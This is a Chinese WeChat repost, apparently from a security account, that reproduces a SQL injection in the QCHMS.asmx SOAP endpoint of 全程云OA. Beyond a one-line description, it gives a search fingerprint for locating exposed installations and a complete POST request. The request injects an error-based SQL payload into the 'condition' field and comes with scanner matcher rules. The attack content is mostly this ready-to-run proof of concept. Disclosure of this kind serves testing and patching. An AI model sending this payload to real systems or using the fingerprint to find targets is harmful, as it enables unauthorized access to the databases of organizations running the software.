---
title: [漏洞复现]全程云OA QCHMS.asmx SQL注入漏洞(VEID-2026-11106)
url: https://mp.weixin.qq.com/s/ZMDSNOwPbwCIj8ARhG3MOQ
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:26:54.035580
---

# [漏洞复现]全程云OA QCHMS.asmx SQL注入漏洞(VEID-2026-11106)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/iaZeP7cJpWXPfTkYW1ib9RR97W9iac4rBTxcKuzRnAAqicT3W5eGmggiaGXpdPcKW5OBX7bHqOoladgMqIHoJjak4tte43Xu0U2W6IS8Zhl7yVPc/0?wx_fmt=jpeg)

# [漏洞复现]全程云OA QCHMS.asmx SQL注入漏洞(VEID-2026-11106)

老谢
老谢

H4ll0 H4ck3r

![]()

在小说阅读器中沉浸阅读

```
声明: 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，H4ll0 H4ck3r及文章作者不为此承担任何责任。H4ll0 H4ck3r拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经H4ll0 H4ck3r允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
```

**漏洞描述**

```
全程云OA QCHMS.asmx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。
```

**影响版本**

```
全程云OA
```

**空间测绘**

```
body="images/yipeoplehover.png"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXMeDgk2mm5Q2GX6K4mCeS1AU4rRYF249qXxyH6QeeUOicHJekTXuicGX3AoxN6ibibQzWW7iawj23FcNZrU4nVyZ1BibnicujU9T659E0/640?wx_fmt=png&from=appmsg)

**本地漏洞环境复现**

![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXPWklOVrmKAgaoTJkSa1qAA329qDOe6jVS2Xd4ibcrUjJibgHVbNXy9rmcVPh7aFPiavSb1fic8dfVTgKibAaePDRRwibzn9gcz3IRiak/640?wx_fmt=png&from=appmsg)

**Veil POC**

```
POST /OA/HMS/QCHMS.asmx HTTP/1.1Host: {{Hostname}}User-Agent: {{random_ua}}SOAPAction: "http://tempuri.org/GetProjectResumeList"Content-Type: text/xml; charset=utf-8
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetProjectResumeList xmlns="http://tempuri.org/">   <pageIndex>1</pageIndex>   <pageSize>20</pageSize>   <condition> AND 1078 IN (SELECT CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(111)+CHAR(32)+CHAR(118)+CHAR(101)+CHAR(105)+CHAR(108))</condition>  </GetProjectResumeList> </soap:Body></soap:Envelope>
#@ condition: and#@ matcher: body contains "'hello veil'"#@ matcher: status_code == 500
```

![](https://mmbiz.qpic.cn/mmbiz_png/iaZeP7cJpWXOhCtEoSVwlz1BMsibNAtnbpVllvaTsQ2pwkFUXR4hx47icBCb07P7CtECRPQO3C61F0zIhAP6x47Ox0cDSuYwrwuia7eXexqxg7M/640?wx_fmt=png&from=appmsg)

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/8fYftyKIIl2vGhrohalRqLRQpkibEC5wNfJWt0jFbsUL94DTBPoXLsLKV2MCEQnhSFqrbo6ATs8CtLvJmw7aJ0w/0?wx_fmt=png)

H4ll0 H4ck3r

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/8fYftyKIIl2vGhrohalRqLRQpkibEC5wNfJWt0jFbsUL94DTBPoXLsLKV2MCEQnhSFqrbo6ATs8CtLvJmw7aJ0w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过